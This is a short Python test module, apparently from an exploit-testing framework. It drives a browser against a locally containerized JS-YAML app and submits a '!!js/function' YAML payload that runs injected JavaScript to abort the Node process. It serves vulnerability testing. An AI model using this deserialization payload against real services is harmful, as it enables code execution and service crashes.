from selenium.webdriver.common.by import By
from data.exploits.base.BasicExploit import BasicExploit
from settings import mapped_port_host

class Exploit(BasicExploit):

	attributes = {
		  "Name" : "JS-YAML_test",
		  "Description" : "Test suite for the JS-YAML application",
		  "Target" : "jsyaml",
		  "Container" : "ubuntu-node",
		  "Type" : "N/A"
		  #http://www.exploit-db.com/exploits/28655/
	}

	def runExploit(self):
		w = self.wrapper
		w.navigate("http://localhost:%s/" % mapped_port_host)
		w.find("name").keys("a: !!js/function function f() {process.abort();}();")
		self.assertIn("not found", w.page_source())
